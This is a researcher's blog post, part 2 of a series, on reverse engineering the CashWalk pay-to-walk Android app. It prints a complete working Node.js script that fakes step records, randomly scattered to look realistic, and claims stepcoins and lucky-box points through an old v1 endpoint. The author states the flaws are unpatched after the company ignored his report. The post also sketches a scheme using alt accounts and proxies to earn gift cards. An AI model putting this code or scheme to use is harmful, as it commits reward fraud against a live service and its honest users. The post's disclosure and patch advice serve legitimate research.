+++
title = 'Reverse Engineering a Pay-To-Walk App (Part 2) - CashWalk'
date = 2025-09-30T02:35:51Z
draft = false
+++

# Reverse Engineering a Pay-To-Walk App (Part 2) - CashWalk

If you didn't come from part 1 (where I successfully set up a MITM environment with CashWalk and mod the APK to disable its anti-root anti-emulator protections; this let me pentest way easier and way faster with my AVD), CashWalk is a platform that pays you to walk in gift cards. Last blog/writeup, I set up an MITM environment, and I'll attach my script that automatically pushed the MITM cert to the rooted AVD so I could start it with mitmweb easily below.

In this part, I do skip over a lot of good-to-know info for a public disclosure, because unlike web-pentesting where I'm familiar with everything I do (therefore, I can write about it at a deeper level), there are so many new moving parts that I know exist but can't write about, so I just don't.

## Doxr's Severeness Rating:

End Users affected: [Over 3 million users/"walkers"](https://cashwalklabs.io/).

Doxr's Rating: 8/10

Why: While it cheats the system, eventually leading to losses for the company and cheating the people who do it legit, it's still all intended behavior (TO THE SERVER! None of this is actually intended to happen, which is why it's a vulnerability).

## Botting lucky-boxes

The first couple days, the requests that the server made were super strange. Firstly, they seemed to check how the app was installed (I don't think they used Play Integrity API to check) at the sign-up stage when you put in a referrer code. It was triggered because I was using an unofficial install.

However, I bypassed this easily. I could copy the (unsuccessful) PUT request that the program tried to make when setting a referrer, and manually cURL it myself by making the body `{}`, which made the server think that I put in a referrer and got past the unofficial APK test screen.

By the way, for those who don't know, [Play Integrity API](https://developer.android.com/google/play/integrity) is a pretty big deal here, because it's a source of truth regarding APK integrity and the system itself. That's because it goes directly to a hardware module (something AVD doesn't have), where the system determines root status, if it's running an official ROM, looks for hooking frameworks, and the app status (ex. if it was installed through Google Play). Then, that signed information goes to the Google server to validate, where the Google server then relays the information directly to the CashWalk backend, where it can then take action. I'm bringing this up as it directly pertains to patching the issue with botting CashWalk; it makes it impossible for an attacker to lie about what they're doing, and if they enforce at key points like login, the entire chain is disrupted.

The same thing exists for Apple, called App Attest, by the way.

Now, back to lucky-boxes: the lucky box request is simply an array of 0 to 6 (so 7 lucky boxes); you send a request specifying what box to open, and then the points are rewarded to your account. Normally, you would have to do some steps and watch an ad to open a lucky box, but the request doesn't even take any data from the ad process or read steps to determine whether the lucky box should actually be awarded.

Then, after that, there's a second request: a bonus box. Essentially, it doubles the points you get from a box; so, if you rolled 6 points the first time, the bonus request turns that to 12 points, and so on. 

This was very simple to turn into a script, after setting up authentication (remote auth was a problem to deal with, so information about it will come up later).

## Botting steps and points

This was probably what you were looking for. This took a bit longer, as authentication-based errors ended up confusing me a lot. 

To start, I did authentication (like the lucky-box script) through Facebook, as Google Auth would be harder to set up. For some reason, Google Auth really didn't want to happen on the AVD/patched APK, so I decided to go with Facebook. Besides, Google Auth is more secure/more resistant to app-less login attempts on Android, I'm pretty sure. It would've been hard to figure out Google Auth through the AVD, as Android apps typically use Google authentication through something called [Android Credential Manager API](https://developers.google.com/identity/android-credential-manager); CashWalk itself uses something older, the Google Sign-In SDK (which uses [AccountManager](https://developer.android.com/reference/android/accounts/AccountManager)). Regardless of whether the app used ACM API or AccountManager, both don't use OAuth URLs or the browser, but thankfully, CashWalk supported a 3rd party login, Facebook, that used OAuth URLs that I could generate and use on my laptop. I hardcoded all of the auth payload into my PoC script, as the server didn't really care how old it was (yes, this included the Facebook OAuth 2.0 callback token). This is what it looked like: 

```js
const AUTH_PAYLOAD = {
  "adId": "uuid", //[a UUID, I'm not sure what it's for]
  "appVersion": "X.X.X", // app version
  "email": "", // since I signed up for facebook with my number, it kept this empty
  "gender": "", // didn't specify
  "id": "1220987183XXXXXXXX", // my facebook ID associated with the facebook app
  "idToken": "", // related with google auth, keeping it empty worked since I did facebook auth
  "nickname": "string", // the name of the login
  "profileUrl": "https://graph.facebook.com/v6.0/[user ID]/picture?type=large", // profile picture that contained my facebook user ID
  "timezone": -999, // the time zone relative to UTC?
  "token": "EAAXXX", // some blob that facebook callback returned; this doesn't seem to expire
  "type": "fb", // facebook auth
  "uniqueKey": "ABC123", // this comes up later
  "useDayLightType": 1 // day light time
};
```

The thing is, until later, I randomized uniqueKey and hardcoded the token, and since it worked for authentication to lucky box, it would work for this, right?

Well, first, I botted steps, which was a very simple task. You return an array with every single item representing the amount of steps to the corresponding hour. This was mutable, as I could add on (this probably helps with realism). From there, you send a request, /v2/stepcoin/[coin amount], where the server would either reject it or grant the coints/points. However, I ran into an issue very quicky: while it could write steps, it kepts failing on stepcoin. This is because, on the very day I wrote the CashWalk Part 1 blog, the app updated to use a different route, which was just /v2/... except with v3. This was a problem, because this one was more secure, and the app kept triggering unofficial-install popups when I tried to capture the request for stepcoins.

However, with some random experimenting, I realized that, while they changed the route from v2 to v3, they actually kept the super old v1 stepcoin route intact; as soon as I learned this, I went to download the earliest version of CashWalk (Android 9.0) that I could, and patched it for it's emulator and root checks (strangely, in this version, there was actually an `RxEmulatorDetector.smali` file that I could update, and I also updated some BuildConfig variables to make the server think that the app is on latest, but it still figured out it was an old version). However, even though it forced me to update, the lock-screen feature didn't require me to update, and since the lock screen is where you collect stepcoins, I could finally copy the older, insecure v1 request.

It seems that stepcoins are dependent on your steps that the server knows of. It seems obvious, but that means you can't generate an infinite amount, even though the arguments for the API endpoint are pretty simple. Now, what does authentication have to do with this? The steps request went through perfectly, but the stepcoin requests failed with error 500s over and over again. After a lot of frustration and static analysis, I ended up realizing that the exact same bad requests I was making would work with the authentication token that the app was generating. So after a lot of work, I completely integrated the Facebook OAuth in hopes that it was an issue with the callback token being hardcoded (even though the server accepted the hardcoded token). This involved:

1. Finding the end OAuth URL (it would redirect, but it would contain all of the parameters I needed) through MITM
2. Crafting the Authorization URL with the PKCE parameters generated by the script
3. Opening the link for the client in the browser
4. Catching the redirect to the specific URL Scheme it used for mobile callbacks, through a custom app registered on my laptop that would then send a request to the unofficial/unauthorized local callback URL that the script opened.
5. Taking the callback and sending the final request to get the Facebook token

However, this STILL didn't work, and the server kept rejecting my responses. So I looked closer at the authentication request past Facebook OAuth, and I found that the uniqueKey wasn't actually random; it was consistent, so when I hardcoded the uniqueKey that the app generated, it worked perfectly. 

When I made a facebook alt and reused my device ID, that worked too, so I assume that there's some sort of algorithmic check on uniqueKey...? I'm not fully sure about the role of uniqueKey. But what I do know is that it's an Android Device ID; that's about it.

## Reporting

After looking around, I saw that there was no security email, once again. So, I sent them an email to their support email, and I actually got an automated email back, making me think that my issue might get escalated to the right people.

![automated mail](../../automail.png)

However, I, once again, got ignored. Seeing as how `cashwalklabs.io` is English but `cashwalk.com` is Korean (I'm pretty sure the company is based in Korea), it might've been a language barrier or something. I'm releasing this blog without the patch (I know that the rest of the blog assumes the app is already patched, but it was written prior to me getting ghosted by the support team). Please do not attack CashWalk, as the point of this blog is to inform others about reverse engineering an app, not to leak an exploit or something like that.

![crazy ghosting](../../ghostedwalk.png)

## PoC and Related Files

This is for analysis, not to actually attack the app (by the time the blog is public, these shouldn't be able to generate stepcoins).

Desktop FB Callback handler:

fb3063132263700744.desktop:
```toml
[Desktop Entry]
Name=FB OAuth Handler (cashwalk)
Exec=/usr/bin/env node /path/to/fb_scheme_handler.js %u
Type=Application
StartupNotify=false
MimeType=x-scheme-handler/fb3063132263700744;
NoDisplay=true
```
This file lets the browser connect fb3063132263700744://authorize xdg-open requests to the handler.

fb_scheme_handler.js:
```js
#!/usr/bin/env node
// Usage: the OS will call this script with the custom-scheme URL as the first argument - this simulates what the phone would do
// The script will then POST the full URL to a local srever expected at http://localhost:8088/fb_token
// and also write it to /tmp/fb_oauth_capture.txt for debugging.

const http = require('http'); // use built in module so we dont need npm

function parseFragmentParams(fragment) {
	// fragment might be like access_token=...&id_token=...&state=... etc.
	if (!fragment) return null;
	const out = {};
	const parts = fragment.replace(/^#/, '').split('&');
	for (const p of parts) {
		const [k, v] = p.split('=');
		if (!k) continue;
		try { out[k] = decodeURIComponent(v || ''); } catch (e) { out[k] = v || ''; }
	}
	return Object.keys(out).length ? out : null;
}

async function postToLocal(dataObj) {
	try {
		const data = JSON.stringify(dataObj);
		const options = {
			hostname: 'localhost',
			port: 8088,
			path: '/fb_token',
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
				'Content-Length': Buffer.byteLength(data)
			}
		};
		return await new Promise((resolve, reject) => {
			const req = http.request(options, (res) => {
				let body = '';
				res.on('data', chunk => body += chunk);
				res.on('end', () => resolve({ status: res.statusCode, body }));
			});
			req.on('error', reject);
			req.write(data);
			req.end();
		});
	} catch (e) {
		return { error: e.message };
	}
}

(async function main(){
	try {
		const url = process.argv[2];
		if (!url) {
			console.error('No URL provided to scheme handler');
			process.exit(1);
		}
			// write to tmp for debugging/local inspection
			try { require('fs').writeFileSync('/tmp/fb_oauth_capture.txt', url + '\n', { flag: 'a' }); } catch (e) {}

			// parse the URL and fragment into token fields when possible
			let payload = null;
			try {
				const parsed = new URL(url);
				// fragment after '#'
				const frag = parsed.hash || '';
				const fragParams = parseFragmentParams(frag);
				if (fragParams && (fragParams.access_token || fragParams.id_token)) {
					payload = fragParams;
				} else {
					const q = {};
					for (const [k, v] of parsed.searchParams.entries()) q[k] = v;
					if (q.access_token || q.id_token) payload = q;
				}
			} catch (e) {
				// malformed URL, fallback to raw
				payload = null;
			}

			const res = await postToLocal(payload ? payload : { url });
		if (res && res.status) {
			console.log('Posted to local server:', res.status);
			process.exit(0);
		}
		console.error('Failed to POST to local server:', res.error || res);
		process.exit(1);
	} catch (err) {
		console.error('Handler error:', err && err.message ? err.message : err);
		process.exit(2);
	}
})();
```

This handler sends the fb3063132263700744://authorize callback token to the main PoC script.

Commands to register the desktop app/callback hook:
```bash
cp fb3063132263700744.desktop ~/.local/share/applications/
update-desktop-database ~/.local/share/applications || true
xdg-mime default fb3063132263700744.desktop x-scheme-handler/fb3063132263700744
```

main.js:
```js
const crypto = require('crypto');
let fetch;
try { fetch = globalThis.fetch; } catch (e) { /* ignore */ }
if (!fetch) {
  try { fetch = require('node-fetch'); } catch (e) { /* node-fetch not installed */ }
}
const http = require('http');
const { exec } = require('child_process');

// --- API Endpoints ---
const AUTH_ENDPOINT = 'http://api.cashwalklabs.io/v1/user';
const STEP_RECORD_ENDPOINT = 'http://api.cashwalklabs.io/v2/record/step';
const STEP_COIN_ENDPOINT_V1 = 'http://api.cashwalklabs.io/v1/stepcoin';
const LUCKYBOX_ENDPOINT = 'http://api.cashwalklabs.io/v2/lucky-box';
const BONUS_ENDPOINT = 'http://api.cashwalklabs.io/v2/lucky-box/bonus';

// --- Configuration ---
const AUTH_PAYLOAD = {
  adId: crypto.randomUUID(),
  "appVersion": "1.4.9",
  email: '',
  gender: '',
  id: '',
  idToken: '',
  nickname: '',
  profileUrl: '',
  timezone: -360,
  "token": null, // This will be populated by the Facebook OAuth flow
  type: 'fb',
  "uniqueKey": "[redacted]", // I redacted my uniqueKey
  useDayLightType: 1
};
const DEFAULT_FB_APP_ID = '3063132263700744';

// --- Helper Functions ---
const sleep = ms => new Promise(res => setTimeout(res, ms));

async function apiRequest(url, options) {
  try {
    const res = await fetch(url, options);
    const text = await res.text();
    let json = null;
    try { json = text ? JSON.parse(text) : null; } catch (e) { json = null; }
    return { status: res.status, ok: res.ok, json, rawText: text };
  } catch (err) {
    return { status: 500, ok: false, json: { error: err.message } };
  }
}

// --- Authentication ---
async function facebookOAuthFlow({ appId, port = 8088, scope = 'public_profile,email' } = {}) {
  return new Promise((resolve, reject) => {
    const nonce = crypto.randomBytes(16).toString('hex');
    const redirectUri = `fb${appId}://authorize/`;
    const openAuthUrl = (authUrl) => {
      console.log('Opening browser to Facebook login — if it does not open, visit:');
      console.log(authUrl);
      const opener = process.platform === 'win32' ? 'start' : process.platform === 'darwin' ? 'open' : 'xdg-open';
      exec(`${opener} "${authUrl}"`, (err) => { if (err) console.log('Please open the URL manually'); });
    };
    const base64url = (buf) => buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    const codeVerifier = base64url(crypto.randomBytes(32));
    const codeChallenge = base64url(crypto.createHash('sha256').update(codeVerifier).digest());
    const stateObj = { "0_auth_logger_id": crypto.randomUUID(), "3_method": "custom_tab", "7_challenge": codeChallenge.slice(0, 20) };
    const stateParam = JSON.stringify(stateObj);
    const cbt = Date.now();
    const e2e = JSON.stringify({ init: cbt });
    const authParams = new URLSearchParams({
      cct_prefetching: '0', client_id: appId, cbt: String(cbt), e2e, ies: '0',
      sdk: 'android-16.3.0', sso: 'chrome_custom_tab', nonce, scope,
      response_type: 'id_token,token,signed_request,graph_domain',
      state: stateParam, code_challenge_method: 'S256', code_challenge: codeChallenge,
      default_audience: 'friends', login_behavior: 'NATIVE_WITH_FALLBACK',
      redirect_uri: redirectUri, auth_type: 'rerequest', return_scopes: 'true'
    });
    const authUrl = `https://m.facebook.com/v16.0/dialog/oauth?${authParams.toString()}`;
    const server = http.createServer(async (req, res) => {
      if (req.method === 'POST' && req.url === '/fb_token') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
          const parsed = JSON.parse(body);
          const accessToken = parsed.access_token || parsed.token || null;
          if (!accessToken) {
            server.close();
            return reject(new Error('Missing token in POST from browser'));
          }
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<html><body><h2>Authentication successful! You can close this window.</h2></body></html>');
          server.close();
          resolve(accessToken);
        });
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(`<!doctype html><html><body><script>
        (function(){
          const hash = location.hash.substring(1);
          const parts = hash.split('&').reduce((acc, kv)=>{ const [k,v]=kv.split('='); if(k) acc[k]=decodeURIComponent(v); return acc; },{});
          fetch('/fb_token', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(parts)})
            .then(()=>document.body.innerText='Logged in! You can close this window.')
            .catch(e=>document.body.innerText='Error sending token to script.');
        })();
      </script></body></html>`);
    });
    server.listen(port, () => openAuthUrl(authUrl));
    setTimeout(() => { try { server.close(); } catch (e) {} ; reject(new Error('OAuth flow timed out')); }, 5 * 60 * 1000);
  });
}

async function authenticate() {
  console.log('Authenticating...');
  console.log('Attempting interactive Facebook OAuth flow...');
  try {
    const fbToken = await facebookOAuthFlow({ appId: DEFAULT_FB_APP_ID });
    AUTH_PAYLOAD.token = fbToken;
    console.log('Fetching Facebook profile...');
    const graphUrl = new URL('https://graph.facebook.com/v16.0/me');
    graphUrl.search = new URLSearchParams({ fields: 'id,name,picture.type(large)', access_token: fbToken }).toString();
    const fbRes = await apiRequest(graphUrl.toString(), { method: 'GET' });
    if (!fbRes.ok || !fbRes.json) {
      throw new Error(`Failed to fetch Facebook profile: HTTP ${fbRes.status} ${fbRes.rawText}`);
    }
    const { id, name, picture } = fbRes.json;
    if (!id || !name || !picture?.data?.url) {
      throw new Error('Incomplete data received from Facebook Graph API');
    }
    AUTH_PAYLOAD.id = id;
    AUTH_PAYLOAD.nickname = name;
    AUTH_PAYLOAD.profileUrl = picture.data.url;
    console.log(`✅ Fetched profile for: ${name} (ID: ${id})`);

    const { ok, json, status } = await apiRequest(AUTH_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'okhttp/4.10.0' },
      body: JSON.stringify(AUTH_PAYLOAD)
    });
    if (!ok) throw new Error(`Auth failed: HTTP ${status} ${JSON.stringify(json)}`);
    const token = json?.result?.token;
    if (!token) throw new Error('Token not found in auth response after FB OAuth');
    console.log('✅ Authenticated successfully!');
    return token;
  } catch (err) {
    console.error('Authentication failed:', err.message || err);
    throw err;
  }
}

// --- Step Points Logic ---
async function getExistingDaySteps(token, dateStr) {
  const url = `${STEP_RECORD_ENDPOINT}?access_token=${encodeURIComponent(token)}&from=${dateStr}&to=${dateStr}&type=day`;
  const { ok, json } = await apiRequest(url, { method: 'GET', headers: { 'User-Agent': 'okhttp/4.10.0' } });
  if (!ok) return null;
  const rec = json?.result?.[0];
  const stepArr = rec && Array.isArray(rec.step) ? rec.step : null;
  if (!stepArr) return null;
  const out = Array(24).fill(0);
  for (let i = 0; i < Math.min(24, stepArr.length); i++) out[i] = Number(stepArr[i] || 0);
  return out;
}

async function uploadSteps(token, stepsDelta) {
  const now = new Date();
  const dateStr = now.toISOString().slice(0, 10);
  const currentHour = now.getHours();
  const stepArray = await getExistingDaySteps(token, dateStr) || Array(24).fill(0);
  let remainingSteps = stepsDelta;
  if (currentHour > 0) {
    const scatterPercentage = Math.random() * 0.3 + 0.2;
    let stepsToScatter = Math.floor(stepsDelta * scatterPercentage);
    remainingSteps -= stepsToScatter;
    const numActivityBlocks = Math.floor(Math.random() * 3) + 1;
    for (let i = 0; i < numActivityBlocks; i++) {
      if (stepsToScatter <= 0) break;
      const pastHour = Math.floor(Math.random() * currentHour);
      const stepsForThisBlock = (i === numActivityBlocks - 1) ? stepsToScatter : Math.floor(stepsToScatter * Math.random());
      stepArray[pastHour] = (stepArray[pastHour] || 0) + stepsForThisBlock;
      stepsToScatter -= stepsForThisBlock;
    }
  }
  stepArray[currentHour] = (stepArray[currentHour] || 0) + remainingSteps;
  const finalStepArray = stepArray.map(s => Math.floor(s));
  const body = { record: [{ date: dateStr, step: finalStepArray }], timezone: -360, useDayLightType: 1 };
  const url = `${STEP_RECORD_ENDPOINT}?access_token=${encodeURIComponent(token)}`;
  const { ok, status, json } = await apiRequest(url, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'okhttp/4.10.0' },
    body: JSON.stringify(body)
  });
  if (!ok) throw new Error(`Upload failed: HTTP ${status} ${JSON.stringify(json)}`);
  console.log(`✅ PUT ${stepsDelta} steps, distributed across hours up to hour ${currentHour} (date ${dateStr})`);
}

async function getDayTotal(token, dateStr) {
  const arr = await getExistingDaySteps(token, dateStr);
  return arr ? arr.reduce((a, b) => a + Number(b || 0), 0) : 0;
}

async function claimStepcoin(token, points = 1) {
  const requestId = crypto.randomUUID();
  const params = new URLSearchParams({ timezone: '-360', useDaylightType: '1', requestId }).toString();
  const url = `${STEP_COIN_ENDPOINT_V1}/${points}?${params}`;
  const body = new URLSearchParams({ access_token: token }).toString();
  const headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'okhttp/4.10.0'
  };
  const { ok, json, status } = await apiRequest(url, { method: 'PUT', headers, body });
  if (!ok) {
    console.error(`Claim of ${points} points failed: HTTP ${status}`);
    if (status === 500 && json?.error?.code === 452) {
      return { success: false, limitReached: true };
    }
    return { success: false, limitReached: false };
  }
  console.log(`✅ Claimed ${points} stepcoin (requestId=${requestId})`);
  return { success: true };
}

async function performSingleSprint(token) {
  let totalPointsClaimedThisRun = 0;
  let dailyLimitReached = false;
  const dailyTarget = 100;
  const maxChunk = 6;
  while (totalPointsClaimedThisRun < dailyTarget && !dailyLimitReached) {
    const stepsThisBatch = Math.floor(Math.random() * 50 + 500);
    await uploadSteps(token, stepsThisBatch);
    const today = new Date().toISOString().slice(0, 10);
    const serverTotalSteps = await getDayTotal(token, today);
    console.log(`Server total for ${today}: ${serverTotalSteps} steps`);
    const availablePoints = Math.floor(serverTotalSteps / 100);
    let remainingToClaim = Math.min(availablePoints - totalPointsClaimedThisRun, dailyTarget - totalPointsClaimedThisRun);
    if (remainingToClaim <= 0) {
      console.log('Not enough steps banked to claim more points. Adding more steps...');
      await sleep(2000 + Math.floor(Math.random() * 2000));
      continue;
    }
    console.log(`Will attempt to claim up to ${remainingToClaim} point(s) in chunks`);
    while (remainingToClaim > 0) {
      const chunk = Math.min(remainingToClaim, maxChunk);
      const result = await claimStepcoin(token, chunk);
      if (result.success) {
        totalPointsClaimedThisRun += chunk;
        remainingToClaim -= chunk;
        await sleep(600 + Math.floor(Math.random() * 400));
      } else {
        if (result.limitReached) {
          console.log('Server indicated daily limit has been reached. Halting all claims.');
          dailyLimitReached = true;
          break;
        }
        if (chunk > 1) {
          const smaller = Math.max(1, Math.floor(chunk / 2));
          console.log(`Chunk ${chunk} failed; trying smaller chunk ${smaller}`);
          const retryResult = await claimStepcoin(token, smaller);
          if (retryResult.success) {
            totalPointsClaimedThisRun += smaller;
            remainingToClaim -= smaller;
            await sleep(600 + Math.floor(Math.random() * 400));
            continue;
          }
        }
        console.error('Chunk claim failed; stopping claims for this cycle.');
        break;
      }
    }
    console.log(`Points claimed in this run: ${totalPointsClaimedThisRun}/${dailyTarget}`);
    if (dailyLimitReached) break;
  }
  console.log(`🎉 Sprint Finished. Total points claimed: ${totalPointsClaimedThisRun}`);
  return dailyLimitReached;
}

// --- Lucky Box Logic ---
async function openLuckyBoxes(token) {
  console.log('\n--- 🎁 Starting Lucky Box Opening ---');
  for (let i = 0; i < 7; i++) {
    // Step 1: Normal lucky box open
    const boxBody = { boxNumber: i, timeZone: -360, useDaylightType: true, isLuckyBoxTimeOut: false };
    const url = `${LUCKYBOX_ENDPOINT}?access_token=${encodeURIComponent(token)}`;
    console.log(`Opening lucky box #${i}...`);
    const res1 = await apiRequest(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'okhttp/4.10.0' },
        body: JSON.stringify(boxBody),
    });
    console.log(`Box #${i} normal response:`, res1.status, res1.json ?? '(no JSON)');
    await sleep(500 + Math.random() * 500); // Small delay

    // Step 2: Bonus lucky box open
    const bonusBody = new URLSearchParams({ boxNumber: i, timeZone: -360 }).toString();
    console.log(`Claiming bonus for box #${i}...`);
    const res2 = await apiRequest(BONUS_ENDPOINT, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'okhttp/4.10.0',
            'Authorization': `Bearer ${token}`
        },
        body: bonusBody,
    });
    console.log(`Box #${i} bonus response:`, res2.status, res2.json ?? '(no JSON)');
    await sleep(1000 + Math.random() * 1000); // Longer delay between boxes
  }
}

// --- Main Execution ---
async function main() {
  let token;
  try {
    token = await authenticate();
  } catch (err) {
    console.error('Initial authentication failed. The script cannot continue.', err.message || err);
    return;
  }

  try {
    console.log('\n--- 🚀 Starting Step Sprints ---');
    let limitWasHit = false;
    let sprintCount = 1;
    while (!limitWasHit) {
      console.log(`\n--- Sprint #${sprintCount} ---`);
      limitWasHit = await performSingleSprint(token);
      if (limitWasHit) {
        console.log('\n✅ Daily stepcoin limit reached.');
      } else {
        console.log(`\n--- Sprint #${sprintCount} complete. ---`);
        sprintCount++;
        await sleep(2000);
      }
    }

    await openLuckyBoxes(token);

    console.log('\n🎉 All tasks have been completed successfully!');

  } catch (err) {
    console.error('A fatal error occurred during script execution:', err.message || err);
  }
}

main();
```

Getting the environment fully set up to start botting is left as an exercise for the reader (this is a joke don't try to use this PoC to bot CashWalk).

startAVD.sh:
```bash
#!/bin/bash

# --- Configuration ---
AVD_NAME="cashwalk"
MEMORY="8096"
PROXY="http://127.0.0.1:8080"
CERT_FILE="c8750f0d.0" # Make sure this file is in the same directory as the script

# --- Script Start ---
echo "✅ Starting the All-in-One AVD Prep Script..."

# Step 1: Launch the emulator in the background in writable mode
echo "⏳ Launching AVD '$AVD_NAME' in writable mode..."
emulator -avd "$AVD_NAME" -writable-system -no-snapshot-load -memory "$MEMORY" -http-proxy "$PROXY" &

# Step 2: Wait for the device to be fully booted
echo "⏳ Waiting for emulator to boot completely..."
adb wait-for-device shell 'while [[ -z $(getprop sys.boot_completed) ]]; do sleep 1; done;'
echo "✅ Emulator is booted."

# Step 3: Prepare the certificate
echo "🔧 Preparing the certificate for installation..."
echo "✅ Certificate renamed to $CERT_FILE"

# Step 4: Install the certificate
echo "⏳ Installing certificate as a system trusted CA..."
adb root
adb remount
adb push "$CERT_FILE" /system/etc/security/cacerts/
adb shell "chmod 644 /system/etc/security/cacerts/$CERT_FILE && reboot"
echo "✅ Certificate pushed and permissions set. Rebooting emulator..."

# Step 5: Clean up the temporary cert file
rm "$CERT_FILE"

echo "🎉 --- SETUP COMPLETE --- 🎉"
echo "The emulator has rebooted with the system certificate installed."
echo "You can now launch it normally for your analysis."
```

While it assumes a lot of things about the system, (like the hashed cert file and the existence of an AVD called cashwalk), this script is useful for setting up a pentesting AVD yourself. A cool project idea would be to automate something like this (think [Genymotion](https://www.genymotion.com/) but with spoofers built in and anti-detection directly in the system, with hidden su access for pentesting convienience).

## Consequences/Losses

There might be someone wondering why I didn't just try to make money with this. With 11 alts (sounds ridiculous at first, but it's actually not that bad), where each one started botting every day for ~275 points (this is how many points you usually get with the PoC), knowing that 3000 points is a 5 dollar giftcard, you could set up a system where every day you make an alt and after making 11 alts, based on the math you are very likely to make 5 dollars a day through gift cards, and moreover, if you keep making alts (say, 22 alts), you can bump that up to 10 dollars a day. Sure, it would need a lot of residental proxies for botting and a reliable residential VPN on a phone, but 5 dollars a day doing nothing at all but running a script is pretty good. 

It's far better than mining bitcoin (net loss of $1.45 to $2.91 after a week), or XMR with virtually any mining pool (net loss of $2.51 after a week), versus running this script after getting the alts and VPN device set up (net gain of $25 per week). However, I had no way of testing the validity of the points without trying to redeem a giftcard using fraudulent points, so I didn't.

The company probably wouldn't lose that much overall from one abuser, but if many people did this (and did it properly), the loss factor would be way higher.

## Conclusion

As this is my first time doing reverse engineering with an app, this experience was pretty cool. Even though I did only what the server expected (for the most part; the v1/v3 bypass for stepcoins wasn't something that the app should've done though, I'm pretty sure), it was still very cool using jadx, apktool, modding my first app, and reading the app's source code. At the time of writing, I am in the middle of learning simple Java and Java syntax, so it was cool to see the real structure of enterprise grade apps.

My patch would be to use the Play Integrity API more generously across the app, and verify with the server. Right now, it depends heavily on "simple" checks that leave the app suseptible to easier pentesting, and the server simply doesn't enforce the client's authenticity. If there is a required nonce from the PIA during user authentication and requests for steps/points/luckyboxes, the platform becomes a lot more secure. That's just me, though.

Also, I noticed that I included a lot more specific details and methodologies than usual, but that's because I want to be able to highlight the specific process for both me in the future and other people who want to approach pentesting Android apps without prior experience.

And finally, I want to say again that I did (and learned about) sooooo much random stuff regarding reverse-engineering this app that I simply couldn't talk about everything in these two parts.

- doxr